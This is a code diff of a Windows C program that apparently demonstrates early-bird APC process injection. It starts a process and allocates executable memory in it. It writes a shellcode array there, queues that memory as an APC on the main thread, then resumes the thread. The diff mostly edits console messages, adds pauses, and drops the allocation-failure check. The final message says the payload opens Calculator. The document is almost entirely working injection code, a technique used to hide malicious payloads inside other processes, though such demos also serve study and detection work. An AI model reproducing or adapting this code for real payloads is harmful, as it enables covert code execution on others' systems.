@@ -1,6 +1,3 @@
-hello
-
-
 ```
 #include <windows.h>
 #include <stdio.h>
@@ -29,7 +26,7 @@ unsigned char shellcode[] =
 
 int main() {
 
-    setbuf(stdout, NULL); // instant console output
+    setbuf(stdout, NULL); // disable buffering
 
     STARTUPINFOA si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
@@ -51,7 +48,8 @@ int main() {
         &si,
         &pi))
     {
-        printf("[-] Failed to create process\n");
+        printf("[-] CreateProcess failed\n");
+        getchar();
         return -1;
     }
 
@@ -65,11 +63,6 @@ int main() {
         PAGE_EXECUTE_READWRITE
     );
 
-    if (!remoteBuffer) {
-        printf("[-] Memory allocation failed\n");
-        return -1;
-    }
-
     WriteProcessMemory(
         pi.hProcess,
         remoteBuffer,
@@ -78,25 +71,28 @@ int main() {
         NULL
     );
 
-    printf("[+] Shellcode written to remote process\n");
+    printf("[+] Shellcode written\n");
 
     QueueUserAPC(
         (PAPCFUNC)remoteBuffer,
         pi.hThread,
-        (ULONG_PTR)NULL
+        0
     );
 
     printf("[+] APC queued to main thread\n\n");
 
-    for (int i = 5; i > 0; i--) {
-        printf("[ ] Thread paused... %d\n", i);
+    for (int i = 5; i >= 1; i--) {
+        printf("[ ] Thread is paused... %d\n", i);
         Sleep(1000);
     }
 
-    printf("\n[!] Resuming thread...\n");
+    printf("\n[!] Resuming thread now\n");
     ResumeThread(pi.hThread);
 
-    printf("[!] APC Injection Executed\n");
+    printf("[!] APC executed → Calculator launched\n");
+
+    printf("\nPress ENTER to exit...");
+    getchar();  // <-- keeps console open
 
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
